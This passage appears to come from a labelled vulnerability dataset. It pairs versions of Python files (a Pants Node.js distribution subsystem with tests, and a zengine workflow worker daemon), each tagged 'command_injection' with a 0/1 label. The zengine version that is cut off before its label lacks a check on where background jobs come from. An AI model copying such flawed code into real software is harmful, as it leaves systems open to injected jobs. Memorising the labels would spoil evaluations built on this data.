from pants.fs.archive import TGZ
from pants.subsystem.subsystem import Subsystem
from pants.util.memo import memoized_method


logger = logging.getLogger(__name__)


class NodeDistribution(object):
  """"""Represents a self-bootstrapping Node distribution.""""""

  class Factory(Subsystem):
    options_scope = 'node-distribution'

    @classmethod
    def subsystem_dependencies(cls):
      return (BinaryUtil.Factory,)

    @classmethod
    def register_options(cls, register):
      super(NodeDistribution.Factory, cls).register_options(register)
      register('--supportdir', advanced=True, default='bin/node',
               help='Find the Node distributions under this dir.  Used as part of the path to '
                    'lookup the distribution with --binary-util-baseurls and --pants-bootstrapdir')
      register('--version', advanced=True, default='6.9.1',
               help='Node distribution version.  Used as part of the path to lookup the '
                    'distribution with --binary-util-baseurls and --pants-bootstrapdir')
      register('--package-manager', advanced=True, default='npm', fingerprint=True,
               choices=NodeDistribution.VALID_PACKAGE_MANAGER_LIST.keys(),
               help='Default package manager config for repo. Should be one of {}'.format(
                 NodeDistribution.VALID_PACKAGE_MANAGER_LIST.keys()))
      register('--yarnpkg-version', advanced=True, default='v0.19.1', fingerprint=True,
               help='Yarnpkg version. Used for binary utils')

    def create(self):
      # NB: create is an instance method to allow the user to choose global or scoped.
      # It's not unreasonable to imagine multiple Node versions in play; for example: when
      # transitioning from the 0.10.x series to the 0.12.x series.
      binary_util = BinaryUtil.Factory.create()
      options = self.get_options()
      return NodeDistribution(
        binary_util, options.supportdir, options.version,
        package_manager=options.package_manager,
        yarnpkg_version=options.yarnpkg_version)

  PACKAGE_MANAGER_NPM = 'npm'
  PACKAGE_MANAGER_YARNPKG = 'yarnpkg'
  VALID_PACKAGE_MANAGER_LIST = {
    'npm': PACKAGE_MANAGER_NPM,
    'yarn': PACKAGE_MANAGER_YARNPKG
  }

  @classmethod
  def validate_package_manager(cls, package_manager):
    if package_manager not in cls.VALID_PACKAGE_MANAGER_LIST.keys():
      raise TaskError('Unknown package manager: %s' % package_manager)
    package_manager = cls.VALID_PACKAGE_MANAGER_LIST[package_manager]
    return package_manager

  @classmethod
  def _normalize_version(cls, version):
    # The versions reported by node and embedded in distribution package names are 'vX.Y.Z' and not
    # 'X.Y.Z'.
    return version if version.startswith('v') else 'v' + version

  def __init__(self, binary_util, supportdir, version, package_manager, yarnpkg_version):
    self._binary_util = binary_util
    self._supportdir = supportdir
    self._version = self._normalize_version(version)
    self.package_manager = self.validate_package_manager(package_manager=package_manager)
    self.yarnpkg_version = self._normalize_version(version=yarnpkg_version)
    logger.debug('Node.js version: %s package manager from config: %s',
                 self._version, package_manager)

  @property
  def version(self):
    """"""Returns the version of the Node distribution.

    :returns: The Node distribution version number string.
    :rtype: string
    """"""
    return self._version

  def unpack_package(self, supportdir, version, filename):
    tarball_filepath = self._binary_util.select_binary(
      supportdir=supportdir, version=version, name=filename)
    logger.debug('Tarball for %s(%s): %s', supportdir, version, tarball_filepath)
    work_dir = os.path.dirname(tarball_filepath)
    TGZ.extract(tarball_filepath, work_dir)
    return work_dir

  @memoized_method
  def install_node(self):
    """"""Install the Node distribution from pants support binaries.

    :returns: The Node distribution bin path.
    :rtype: string
    """"""
    node_package_path = self.unpack_package(
      supportdir=self._supportdir, version=self.version, filename='node.tar.gz')
    # Todo: https://github.com/pantsbuild/pants/issues/4431
    # This line depends on repacked node distribution.
    # Should change it from 'node/bin' to 'dist/bin'
    node_bin_path = os.path.join(node_package_path, 'node', 'bin')
    return node_bin_path

  @memoized_method
  def install_yarnpkg(self):
    """"""Install the Yarnpkg distribution from pants support binaries.

    :returns: The Yarnpkg distribution bin path.
    :rtype: string
    """"""
    yarnpkg_package_path = self.unpack_package(
      supportdir='bin/yarnpkg', version=self.yarnpkg_version, filename='yarnpkg.tar.gz')
    yarnpkg_bin_path = os.path.join(yarnpkg_package_path, 'dist', 'bin')
    return yarnpkg_bin_path

  class Command(namedtuple('Command', ['executable', 'args', 'extra_paths'])):
    """"""Describes a command to be run using a Node distribution.""""""

    @property
    def cmd(self):
      """"""The command line that will be executed when this command is spawned.

      :returns: The full command line used to spawn this command as a list of strings.
      :rtype: list
      """"""
      return [self.executable] + (self.args or [])

    def _prepare_env(self, kwargs):
      """"""Returns a modifed copy of kwargs['env'], and a copy of kwargs with 'env' removed.

      If there is no 'env' field in the kwargs, os.environ.copy() is used.
      env['PATH'] is set/modified to contain the Node distribution's bin directory at the front.

      :param kwargs: The original kwargs.
      :returns: An (env, kwargs) tuple containing the modified env and kwargs copies.
      :rtype: (dict, dict)
      """"""
      kwargs = kwargs.copy()
      env = kwargs.pop('env', os.environ).copy()
      env['PATH'] = os.path.pathsep.join(self.extra_paths + [env.get('PATH', '')])
      return env, kwargs

    def run(self, **kwargs):
      """"""Runs this command.

      :param **kwargs: Any extra keyword arguments to pass along to `subprocess.Popen`.
      :returns: A handle to the running command.
      :rtype: :class:`subprocess.Popen`
      """"""
      env, kwargs = self._prepare_env(kwargs)
      return subprocess.Popen(self.cmd, env=env, **kwargs)

    def check_output(self, **kwargs):
      """"""Runs this command returning its captured stdout.

      :param **kwargs: Any extra keyword arguments to pass along to `subprocess.Popen`.
      :returns: The captured standard output stream of the command.
      :rtype: string
      :raises: :class:`subprocess.CalledProcessError` if the command fails.
      """"""
      env, kwargs = self._prepare_env(kwargs)
      return subprocess.check_output(self.cmd, env=env, **kwargs)

    def __str__(self):
      return ' '.join(self.cmd)

  def node_command(self, args=None):
    """"""Creates a command that can run `node`, passing the given args to it.

    :param list args: An optional list of arguments to pass to `node`.
    :returns: A `node` command that can be run later.
    :rtype: :class:`NodeDistribution.Command`
    """"""
    # NB: We explicitly allow no args for the `node` command unlike the `npm` command since running
    # `node` with no arguments is useful, it launches a REPL.
    node_bin_path = self.install_node()
    return self.Command(
      executable=os.path.join(node_bin_path, 'node'), args=args,
      extra_paths=[node_bin_path])

  def npm_command(self, args):
    """"""Creates a command that can run `npm`, passing the given args to it.

    :param list args: A list of arguments to pass to `npm`.
    :returns: An `npm` command that can be run later.
    :rtype: :class:`NodeDistribution.Command`
    """"""
    node_bin_path = self.install_node()
    return self.Command(
      executable=os.path.join(node_bin_path, 'npm'), args=args,
      extra_paths=[node_bin_path])

  def yarnpkg_command(self, args):
    """"""Creates a command that can run `yarnpkg`, passing the given args to it.

    :param list args: A list of arguments to pass to `yarnpkg`.
    :returns: An `yarnpkg` command that can be run later.
    :rtype: :class:`NodeDistribution.Command`
    """"""
    node_bin_path = self.install_node()
    yarnpkg_bin_path = self.install_yarnpkg()
    return self.Command(
      executable=os.path.join(yarnpkg_bin_path, 'yarnpkg'), args=args,
      extra_paths=[yarnpkg_bin_path, node_bin_path])
/n/n/ncontrib/node/tests/python/pants_test/contrib/node/subsystems/test_node_distribution.py/n/n# coding=utf-8
# Copyright 2015 Pants project contributors (see CONTRIBUTORS.md).
# Licensed under the Apache License, Version 2.0 (see LICENSE).

from __future__ import (absolute_import, division, generators, nested_scopes, print_function,
                        unicode_literals, with_statement)

import json
import os
import subprocess
import unittest

from pants_test.subsystem.subsystem_util import global_subsystem_instance

from pants.contrib.node.subsystems.node_distribution import NodeDistribution


class NodeDistributionTest(unittest.TestCase):

  def setUp(self):
    self.distribution = global_subsystem_instance(NodeDistribution.Factory).create()

  def test_bootstrap(self):
    node_cmd = self.distribution.node_command(args=['--version'])
    output = node_cmd.check_output()
    self.assertEqual(self.distribution.version, output.strip())

  def test_node(self):
    node_command = self.distribution.node_command(args=['--interactive'])  # Force a REPL session.
    repl = node_command.run(stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    out, err = repl.communicate('console.log(""Hello World!"")')
    self.assertEqual('', err)
    self.assertEqual(0, repl.returncode)

    for line in out.splitlines():
      if line.endswith('Hello World!'):
        break
    else:
      self.fail('Did not find the expected ""Hello World!"" in the REPL session '
                'output:\n{}'.format(out))

  def test_npm(self):
    npm_version_flag = self.distribution.npm_command(args=['--version'])
    raw_version = npm_version_flag.check_output().strip()

    npm_version_cmd = self.distribution.npm_command(args=['version', '--json'])
    versions_json = npm_version_cmd.check_output()
    versions = json.loads(versions_json)

    self.assertEqual(raw_version, versions['npm'])

  def test_yarnpkg(self):
    yarnpkg_version_command = self.distribution.yarnpkg_command(args=['--version'])
    yarnpkg_version = yarnpkg_version_command.check_output().strip()
    yarnpkg_versions_command = self.distribution.yarnpkg_command(args=['versions', '--json'])
    yarnpkg_versions = json.loads(yarnpkg_versions_command.check_output())
    self.assertEqual(yarnpkg_version, yarnpkg_versions['data']['yarn'])

  def test_node_command_path_injection(self):
    node_bin_path = self.distribution.install_node()
    node_path_cmd = self.distribution.node_command(
      args=['--eval', 'console.log(process.env[""PATH""])'])

    # Test the case in which we do not pass in env,
    # which should fall back to env=os.environ.copy()
    injected_paths = node_path_cmd.check_output().strip().split(os.pathsep)
    self.assertEqual(node_bin_path, injected_paths[0])

  def test_node_command_path_injection_with_overrided_path(self):
    node_bin_path = self.distribution.install_node()
    node_path_cmd = self.distribution.node_command(
      args=['--eval', 'console.log(process.env[""PATH""])'])
    injected_paths = node_path_cmd.check_output(
      env={'PATH': '/test/path'}
    ).strip().split(os.pathsep)
    self.assertEqual(node_bin_path, injected_paths[0])
    self.assertListEqual([node_bin_path, '/test/path'], injected_paths)

  def test_node_command_path_injection_with_empty_path(self):
    node_bin_path = self.distribution.install_node()
    node_path_cmd = self.distribution.node_command(
      args=['--eval', 'console.log(process.env[""PATH""])'])
    injected_paths = node_path_cmd.check_output(
      env={'PATH': ''}
    ).strip().split(os.pathsep)
    self.assertListEqual([node_bin_path, ''], injected_paths)
/n/n/n",0,command_injection
25,191,b3683453b29eba54aca6d04cd8a717429257c0fc,"/contrib/node/src/python/pants/contrib/node/subsystems/node_distribution.py/n/n# coding=utf-8
# Copyright 2015 Pants project contributors (see CONTRIBUTORS.md).
# Licensed under the Apache License, Version 2.0 (see LICENSE).

from __future__ import (absolute_import, division, generators, nested_scopes, print_function,
                        unicode_literals, with_statement)

import logging
import os
import subprocess
from collections import namedtuple

from pants.base.exceptions import TaskError
from pants.binaries.binary_util import BinaryUtil
from pants.fs.archive import TGZ
from pants.subsystem.subsystem import Subsystem
from pants.util.contextutil import temporary_dir
from pants.util.memo import memoized_property


logger = logging.getLogger(__name__)


class NodeDistribution(object):
  """"""Represents a self-bootstrapping Node distribution.""""""

  class Factory(Subsystem):
    options_scope = 'node-distribution'

    @classmethod
    def subsystem_dependencies(cls):
      return (BinaryUtil.Factory,)

    @classmethod
    def register_options(cls, register):
      super(NodeDistribution.Factory, cls).register_options(register)
      register('--supportdir', advanced=True, default='bin/node',
               help='Find the Node distributions under this dir.  Used as part of the path to '
                    'lookup the distribution with --binary-util-baseurls and --pants-bootstrapdir')
      register('--version', advanced=True, default='6.9.1',
               help='Node distribution version.  Used as part of the path to lookup the '
                    'distribution with --binary-util-baseurls and --pants-bootstrapdir')
      register('--package-manager', advanced=True, default='npm', fingerprint=True,
               choices=NodeDistribution.VALID_PACKAGE_MANAGER_LIST.keys(),
               help='Default package manager config for repo. Should be one of {}'.format(
                 NodeDistribution.VALID_PACKAGE_MANAGER_LIST.keys()))
      register('--yarnpkg-version', advanced=True, default='v0.19.1', fingerprint=True,
               help='Yarnpkg version. Used for binary utils')

    def create(self):
      # NB: create is an instance method to allow the user to choose global or scoped.
      # It's not unreasonable to imagine multiple Node versions in play; for example: when
      # transitioning from the 0.10.x series to the 0.12.x series.
      binary_util = BinaryUtil.Factory.create()
      options = self.get_options()
      return NodeDistribution(
        binary_util, options.supportdir, options.version,
        package_manager=options.package_manager,
        yarnpkg_version=options.yarnpkg_version)

  PACKAGE_MANAGER_NPM = 'npm'
  PACKAGE_MANAGER_YARNPKG = 'yarnpkg'
  VALID_PACKAGE_MANAGER_LIST = {
    'npm': PACKAGE_MANAGER_NPM,
    'yarn': PACKAGE_MANAGER_YARNPKG
  }

  @classmethod
  def validate_package_manager(cls, package_manager):
    if package_manager not in cls.VALID_PACKAGE_MANAGER_LIST.keys():
      raise TaskError('Unknown package manager: %s' % package_manager)
    package_manager = cls.VALID_PACKAGE_MANAGER_LIST[package_manager]
    return package_manager

  @classmethod
  def _normalize_version(cls, version):
    # The versions reported by node and embedded in distribution package names are 'vX.Y.Z' and not
    # 'X.Y.Z'.
    return version if version.startswith('v') else 'v' + version

  def __init__(self, binary_util, relpath, version, package_manager, yarnpkg_version):
    self._binary_util = binary_util
    self._relpath = relpath
    self._version = self._normalize_version(version)
    self.package_manager = self.validate_package_manager(package_manager=package_manager)
    self.yarnpkg_version = self._normalize_version(version=yarnpkg_version)
    logger.debug('Node.js version: %s package manager from config: %s',
                 self._version, package_manager)

  @property
  def version(self):
    """"""Returns the version of the Node distribution.

    :returns: The Node distribution version number string.
    :rtype: string
    """"""
    return self._version

  def get_binary_path_from_tgz(self, supportdir, version, filename, inpackage_path):
    tarball_filepath = self._binary_util.select_binary(
      supportdir=supportdir, version=version, name=filename)
    logger.debug('Tarball for %s(%s): %s', supportdir, version, tarball_filepath)
    work_dir = os.path.dirname(tarball_filepath)
    unpacked_dir = os.path.join(work_dir, 'unpacked')
    if not os.path.exists(unpacked_dir):
      with temporary_dir(root_dir=work_dir) as tmp_dist:
        TGZ.extract(tarball_filepath, tmp_dist)
        os.rename(tmp_dist, unpacked_dir)
    binary_path = os.path.join(unpacked_dir, inpackage_path)
    return binary_path

  @memoized_property
  def path(self):
    """"""Returns the root path of this node distribution.

    :returns: The Node distribution root path.
    :rtype: string
    """"""
    node_path = self.get_binary_path_from_tgz(
      supportdir=self._relpath, version=self.version, filename='node.tar.gz',
      inpackage_path='node')
    logger.debug('Node path: %s', node_path)
    return node_path

  @memoized_property
  def yarnpkg_path(self):
    """"""Returns the root path of yarnpkg distribution.

    :returns: The yarnpkg root path.
    :rtype: string
    """"""
    yarnpkg_path = self.get_binary_path_from_tgz(
      supportdir='bin/yarnpkg', version=self.yarnpkg_version, filename='yarnpkg.tar.gz',
      inpackage_path='dist')
    logger.debug('Yarnpkg path: %s', yarnpkg_path)
    return yarnpkg_path

  class Command(namedtuple('Command', ['bin_dir_path', 'executable', 'args'])):
    """"""Describes a command to be run using a Node distribution.""""""

    @property
    def cmd(self):
      """"""The command line that will be executed when this command is spawned.

      :returns: The full command line used to spawn this command as a list of strings.
      :rtype: list
      """"""
      return [os.path.join(self.bin_dir_path, self.executable)] + self.args

    def _prepare_env(self, kwargs):
      """"""Returns a modifed copy of kwargs['env'], and a copy of kwargs with 'env' removed.

      If there is no 'env' field in the kwargs, os.environ.copy() is used.
      env['PATH'] is set/modified to contain the Node distribution's bin directory at the front.

      :param kwargs: The original kwargs.
      :returns: An (env, kwargs) tuple containing the modified env and kwargs copies.
      :rtype: (dict, dict)
      """"""
      kwargs = kwargs.copy()
      env = kwargs.pop('env', os.environ).copy()
      env['PATH'] = (self.bin_dir_path + os.path.pathsep + env['PATH']
                     if env.get('PATH', '') else self.bin_dir_path)
      return env, kwargs

    def run(self, **kwargs):
      """"""Runs this command.

      :param **kwargs: Any extra keyword arguments to pass along to `subprocess.Popen`.
      :returns: A handle to the running command.
      :rtype: :class:`subprocess.Popen`
      """"""
      env, kwargs = self._prepare_env(kwargs)
      return subprocess.Popen(self.cmd, env=env, **kwargs)

    def check_output(self, **kwargs):
      """"""Runs this command returning its captured stdout.

      :param **kwargs: Any extra keyword arguments to pass along to `subprocess.Popen`.
      :returns: The captured standard output stream of the command.
      :rtype: string
      :raises: :class:`subprocess.CalledProcessError` if the command fails.
      """"""
      env, kwargs = self._prepare_env(kwargs)
      return subprocess.check_output(self.cmd, env=env, **kwargs)

    def __str__(self):
      return ' '.join(self.cmd)

  def node_command(self, args=None):
    """"""Creates a command that can run `node`, passing the given args to it.

    :param list args: An optional list of arguments to pass to `node`.
    :returns: A `node` command that can be run later.
    :rtype: :class:`NodeDistribution.Command`
    """"""
    # NB: We explicitly allow no args for the `node` command unlike the `npm` command since running
    # `node` with no arguments is useful, it launches a REPL.
    return self._create_command('node', args)

  def npm_command(self, args):
    """"""Creates a command that can run `npm`, passing the given args to it.

    :param list args: A list of arguments to pass to `npm`.
    :returns: An `npm` command that can be run later.
    :rtype: :class:`NodeDistribution.Command`
    """"""
    return self._create_command('npm', args)

  def yarnpkg_command(self, args):
    """"""Creates a command that can run `yarnpkg`, passing the given args to it.

    :param list args: A list of arguments to pass to `yarnpkg`.
    :returns: An `yarnpkg` command that can be run later.
    :rtype: :class:`NodeDistribution.Command`
    """"""
    return self.Command(
      bin_dir_path=os.path.join(self.yarnpkg_path, 'bin'), executable='yarnpkg', args=args or [])

  def _create_command(self, executable, args=None):
    return self.Command(os.path.join(self.path, 'bin'), executable, args or [])
/n/n/n",1,command_injection
26,30,52eafbee90f8ddf78be0c7452828d49423246851,"zengine/wf_daemon.py/n/n#!/usr/bin/env python
""""""
workflow worker daemon
""""""
import json
import traceback
from pprint import pformat

import signal
from time import sleep, time

import pika
from tornado.escape import json_decode

from pyoko.conf import settings
from pyoko.lib.utils import get_object_from_path
from zengine.client_queue import ClientQueue, BLOCKING_MQ_PARAMS
from zengine.engine import ZEngine
from zengine.current import Current
from zengine.lib.cache import Session, KeepAlive
from zengine.lib.exceptions import HTTPError, SecurityInfringementAttempt
from zengine.log import log
import sys
# receivers should be imported at right time, right place
# they will not registered if not placed in a central location
# but they can cause ""cannot import settings"" errors if imported too early
from zengine.receivers import *

sys._zops_wf_state_log = ''

wf_engine = ZEngine()

LOGIN_REQUIRED_MESSAGE = {'error': ""Login required"", ""code"": 401}


class Worker(object):
    """"""
    Workflow runner worker object
    """"""
    INPUT_QUEUE_NAME = 'in_queue'
    INPUT_EXCHANGE = 'input_exc'

    def __init__(self):
        self.connect()
        signal.signal(signal.SIGTERM, self.exit)
        log.info(""Worker starting"")

    def exit(self, signal=None, frame=None):
        """"""
        Properly close the AMQP connections
        """"""
        self.input_channel.close()
        self.client_queue.close()
        self.connection.close()
        log.info(""Worker exiting"")
        sys.exit(0)

    def connect(self):
        """"""
        make amqp connection and create channels and queue binding
        """"""
        self.connection = pika.BlockingConnection(BLOCKING_MQ_PARAMS)
        self.client_queue = ClientQueue()
        self.input_channel = self.connection.channel()

        self.input_channel.exchange_declare(exchange=self.INPUT_EXCHANGE,
                                            type='topic',
                                            durable=True)
        self.input_channel.queue_declare(queue=self.INPUT_QUEUE_NAME)
        self.input_channel.queue_bind(exchange=self.INPUT_EXCHANGE, queue=self.INPUT_QUEUE_NAME)
        log.info(""Bind to queue named '%s' queue with exchange '%s'"" % (self.INPUT_QUEUE_NAME,
                                                                        self.INPUT_EXCHANGE))

    def run(self):
        """"""
        actual consuming of incoming works starts here
        """"""
        self.input_channel.basic_consume(self.handle_message,
                                         queue=self.INPUT_QUEUE_NAME,
                                         no_ack=True)
        try:
            self.input_channel.start_consuming()
        except (KeyboardInterrupt, SystemExit):
            log.info("" Exiting"")
            self.exit()

    def _prepare_error_msg(self, msg):
        try:
            return \
                msg + '\n\n' + \
                ""INPUT DATA: %s\n\n"" % pformat(self.current.input) + \
                ""OUTPUT DATA: %s\n\n"" % pformat(self.current.output) + \
                sys._zops_wf_state_log
        except:
            return msg

    def _handle_ping_pong(self, data, session):

        still_alive = KeepAlive(sess_id=session.sess_id).update_or_expire_session()
        msg = {'msg': 'pong'}
        if not still_alive:
            msg.update(LOGIN_REQUIRED_MESSAGE)
        return msg

    def _handle_job(self, session, data, headers):
        # security check for preventing external job execution attempts
        if headers['source'] != 'Internal':
            raise SecurityInfringementAttempt(
                ""Someone ({user}) from {ip} tried to inject a job {job}"".format(user=session['user_id'], ip=headers['remote_ip'], job=data['job']))
        self.current = Current(session=session, input=data)
        self.current.headers = headers
        # import method
        method = get_object_from_path(settings.BG_JOBS[data['job']])
        # call view with current object
        method(self.current)

    def _handle_view(self, session, data, headers):
        # create Current object
        self.current = Current(session=session, input=data)
        self.current.headers = headers

        # handle ping/pong/session expiration
        if data['view'] == 'ping':
            return self._handle_ping_pong(data, session)

        # handle authentication
        if not (self.current.is_auth or data['view'] in settings.ANONYMOUS_WORKFLOWS):
            return LOGIN_REQUIRED_MESSAGE

        # import view
        view = get_object_from_path(settings.VIEW_URLS[data['view']])

        # call view with current object
        view(self.current)

        # return output
        return self.current.output

    def _handle_workflow(self, session, data, headers):
        wf_engine.start_engine(session=session, input=data, workflow_name=data['wf'])
        wf_engine.current.headers = headers
        self.current = wf_engine.current
        wf_engine.run()
        # if self.connection.is_closed:
        #     log.info(""Connection is closed, re-opening..."")
        #     self.connect()
        return wf_engine.current.output

    def handle_message(self, ch, method, properties, body):
        """"""
        this is a pika.basic_consumer callback
        handles client inputs, runs appropriate workflows and views

        Args:
            ch: amqp channel
            method: amqp method
            properties:
            body: message body
        """"""
        input = {}
        headers = {}
        try:
            self.sessid = method.routing_key

            input = json_decode(body)
            data = input['data']

            # since this comes as ""path"" we dont know if it's view or workflow yet
            # TODO: just a workaround till we modify ui to
            if 'path' in data:
                if data['path'] in settings.VIEW_URLS:
                    data['view'] = data['path']
                else:
                    data['wf'] = data['path']
            session = Session(self.sessid)

            headers = {'remote_ip': input['_zops_remote_ip'],
                       'source': input['_zops_source']}

            if 'wf' in data:
                output = self._handle_workflow(session, data, headers)
            elif 'job' in data:

                self._handle_job(session, data, headers)
                return
            else:
                output = self._handle_view(session, data, headers)

        except HTTPError as e:
            import sys
            if hasattr(sys, '_called_from_test'):
                raise
            output = {'cmd': 'error', 'error': self._prepare_error_msg(e.message), ""code"": e.code}
            log.exception(""Http error occurred"")
        except:
            self.current = Current(session=session, input=data)
            self.current.headers = headers
            import sys
            if hasattr(sys, '_called_from_test'):
                raise
            err = traceback.format_exc()
            output = {'error': self._prepare_error_msg(err), ""code"": 500}
            log.exception(""Worker error occurred with messsage body:\n%s"" % body)
        if 'callbackID' in input:
            output['callbackID'] = input['callbackID']
        log.info(""OUTPUT for %s: %s"" % (self.sessid, output))
        output['reply_timestamp'] = time()
        self.send_output(output)

    def send_output(self, output):
        # TODO: This is ugly, we should separate login process
        # log.debug(""SEND_OUTPUT: %s"" % output)
        if self.current.user_id is None or 'login_process' in output:
            self.client_queue.send_to_default_exchange(self.sessid, output)
        else:
            self.client_queue.send_to_prv_exchange(self.current.user_id, output)


def run_workers(no_subprocess, watch_paths=None, is_background=False):
    """"""
    subprocess handler
    """"""
    import atexit, os, subprocess, signal
    if watch_paths:
        from watchdog.observers import Observer
        # from watchdog.observers.fsevents import FSEventsObserver as Observer
        # from watchdog.observers.polling import PollingObserver as Observer
        from watchdog.events import FileSystemEventHandler

    def on_modified(event):
        if not is_background:
            print(""Restarting worker due to change in %s"" % event.src_path)
        log.info(""modified %s"" % event.src_path)
        try:
            kill_children()
            run_children()
        except:
            log.exception(""Error while restarting worker"")

    handler = FileSystemEventHandler()
    handler.on_modified = on_modified

    # global child_pids
    child_pids = []
    log.info(""starting %s workers"" % no_subprocess)

    def run_children():
        global child_pids
        child_pids = []
        for i in range(int(no_subprocess)):
            proc = subprocess.Popen([sys.executable, __file__],
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
            child_pids.append(proc.pid)
            log.info(""Started worker with pid %s"" % proc.pid)

    def kill_children():
        """"""
        kill subprocess on exit of manager (this) process
        """"""
        log.info(""Stopping worker(s)"")
        for pid in child_pids:
            if pid is not None:
                os.kill(pid, signal.SIGTERM)

    run_children()
    atexit.register(kill_children)
    signal.signal(signal.SIGTERM, kill_children)
    if watch_paths:
        observer = Observer()
        for path in watch_paths:
            if not is_background:
                print(""Watching for changes under %s"" % path)
            observer.schedule(handler, path=path, recursive=True)
        observer.start()
    while 1:
        try:
            sleep(1)
        except KeyboardInterrupt:
            log.info(""Keyboard interrupt, exiting"")
            if watch_paths:
                observer.stop()
                observer.join()
            sys.exit(0)


if __name__ == '__main__':
    if 'manage' in str(sys.argv):
        no_subprocess = [arg.split('manage=')[-1] for arg in sys.argv if 'manage' in arg][0]
        run_workers(no_subprocess)
    else:
        worker = Worker()
        worker.run()
/n/n/n",0,command_injection
27,31,52eafbee90f8ddf78be0c7452828d49423246851,"/zengine/wf_daemon.py/n/n#!/usr/bin/env python
""""""
workflow worker daemon
""""""
import json
import traceback
from pprint import pformat

import signal
from time import sleep, time

import pika
from tornado.escape import json_decode

from pyoko.conf import settings
from pyoko.lib.utils import get_object_from_path
from zengine.client_queue import ClientQueue, BLOCKING_MQ_PARAMS
from zengine.engine import ZEngine
from zengine.current import Current
from zengine.lib.cache import Session, KeepAlive
from zengine.lib.exceptions import HTTPError
from zengine.log import log
import sys
# receivers should be imported at right time, right place
# they will not registered if not placed in a central location
# but they can cause ""cannot import settings"" errors if imported too early
from zengine.receivers import *

sys._zops_wf_state_log = ''

wf_engine = ZEngine()

LOGIN_REQUIRED_MESSAGE = {'error': ""Login required"", ""code"": 401}
class Worker(object):
    """"""
    Workflow runner worker object
    """"""
    INPUT_QUEUE_NAME = 'in_queue'
    INPUT_EXCHANGE = 'input_exc'

    def __init__(self):
        self.connect()
        signal.signal(signal.SIGTERM, self.exit)
        log.info(""Worker starting"")

    def exit(self, signal=None, frame=None):
        """"""
        Properly close the AMQP connections
        """"""
        self.input_channel.close()
        self.client_queue.close()
        self.connection.close()
        log.info(""Worker exiting"")
        sys.exit(0)

    def connect(self):
        """"""
        make amqp connection and create channels and queue binding
        """"""
        self.connection = pika.BlockingConnection(BLOCKING_MQ_PARAMS)
        self.client_queue = ClientQueue()
        self.input_channel = self.connection.channel()

        self.input_channel.exchange_declare(exchange=self.INPUT_EXCHANGE,
                                            type='topic',
                                            durable=True)
        self.input_channel.queue_declare(queue=self.INPUT_QUEUE_NAME)
        self.input_channel.queue_bind(exchange=self.INPUT_EXCHANGE, queue=self.INPUT_QUEUE_NAME)
        log.info(""Bind to queue named '%s' queue with exchange '%s'"" % (self.INPUT_QUEUE_NAME,
                                                                        self.INPUT_EXCHANGE))

    def run(self):
        """"""
        actual consuming of incoming works starts here
        """"""
        self.input_channel.basic_consume(self.handle_message,
                                         queue=self.INPUT_QUEUE_NAME,
                                         no_ack=True)
        try:
            self.input_channel.start_consuming()
        except (KeyboardInterrupt, SystemExit):
            log.info("" Exiting"")
            self.exit()

    def _prepare_error_msg(self, msg):
        try:
            return \
                msg + '\n\n' + \
                ""INPUT DATA: %s\n\n"" % pformat(self.current.input) + \
                ""OUTPUT DATA: %s\n\n"" % pformat(self.current.output) + \
                sys._zops_wf_state_log
        except:
            return msg

    def _handle_ping_pong(self, data, session):

        still_alive = KeepAlive(sess_id=session.sess_id).update_or_expire_session()
        msg = {'msg': 'pong'}
        if not still_alive:
            msg.update(LOGIN_REQUIRED_MESSAGE)
        return msg

    def _handle_job(self, session, data, headers):
        self.current = Current(session=session, input=data)
        self.current.headers = headers
        # import method
        method = get_object_from_path(settings.BG_JOBS[data['job']])
        # call view with current object
        method(self.current)


    def _handle_view(self, session, data, headers):
        # create Current object
        self.current = Current(session=session, input=data)
        self.current.headers = headers

        # handle ping/pong/session expiration
        if data['view'] == 'ping':
            return self._handle_ping_pong(data, session)

        # handle authentication
        if not (self.current.is_auth or data['view'] in settings.ANONYMOUS_WORKFLOWS):
            return LOGIN_REQUIRED_MESSAGE

        # import view
        view = get_object_from_path(settings.VIEW_URLS[data['view']])

        # call view with current object
        view(self.current)

        # return output
        return self.current.output

    def _handle_workflow(self, session, data, headers):
        wf_engine.start_engine(session=session, input=data, workflow_name=data['wf'])
        wf_engine.current.headers = headers
        self.current = wf_engine.current
        wf_engine.run()
        # if self.connection.is_closed:
        #     log.info(""Connection is closed, re-opening..."")
        #     self.connect()
        return wf_engine.current.output

    def handle_message(self, ch, method, properties, body):
        """"""
        this is a pika.basic_consumer callback
        handles client inputs, runs appropriate workflows and views

        Args:
            ch: amqp channel
            method: amqp method
            properties:
            body: message body
        """"""
        input = {}
        try:
            self.sessid = method.routing_key

            input = json_decode(body)
            data = input['data']

            # since this comes as ""path"" we dont know if it's view or workflow yet
            #TODO: just a workaround till we modify ui to
            if 'path' in data:
                if data['path'] in settings.VIEW_URLS:
                    data['view'] = data['path']
                else:
                    data['wf'] = data['path']
            session = Session(self.sessid)

            headers = {'remote_ip': input['_zops_remote_ip']}

            if 'wf' in data:
                output = self._handle_workflow(session, data, headers)
            elif 'job' in data:

                self._handle_job(session, data, headers)
                return
            else:
                output = self._handle_view(session, data, headers)

        except HTTPError as e:
            import sys
            if hasattr(sys, '_called_from_test'):
                raise
            output = {'cmd': 'error', 'error': self._prepare_error_msg(e.message), ""code"": e.code}
            log.exception(""Http error occurred"")
        except:
            self.current = Current(session=session, input=data)
            self.current.headers = headers
            import sys
            if hasattr(sys, '_called_from_test'):
                raise
            err = traceback.format_exc()
            output = {'error': self._prepare_error_msg(err), ""code"": 500}
            log.exception(""Worker error occurred with messsage body:\n%s"" % body)
        if 'callbackID' in input:
            output['callbackID'] = input['callbackID']
        log.info(""OUTPUT for %s: %s"" % (self.sessid, output))
        output['reply_timestamp'] = time()
        self.send_output(output)

    def send_output(self, output):
        # TODO: This is ugly, we should separate login process
        # log.debug(""SEND_OUTPUT: %s"" % output)
        if self.current.user_id is None or 'login_process' in output:
            self.client_queue.send_to_default_exchange(self.sessid, output)
        else:
            self.client_queue.send_to_prv_exchange(self.current.user_id, output)


def run_workers(no_subprocess, watch_paths=None, is_background=False):
    """"""
    subprocess handler
    """"""
    import atexit, os, subprocess, signal
    if watch_paths:
        from watchdog.observers import Observer
        # from watchdog.observers.fsevents import FSEventsObserver as Observer
        # from watchdog.observers.polling import PollingObserver as Observer
        from watchdog.events import FileSystemEventHandler


    def on_modified(event):
        if not is_background:
            print(""Restarting worker due to change in %s"" % event.src_path)
        log.info(""modified %s"" % event.src_path)
        try:
            kill_children()
            run_children()
        except:
            log.exception(""Error while restarting worker"")

    handler = FileSystemEventHandler()
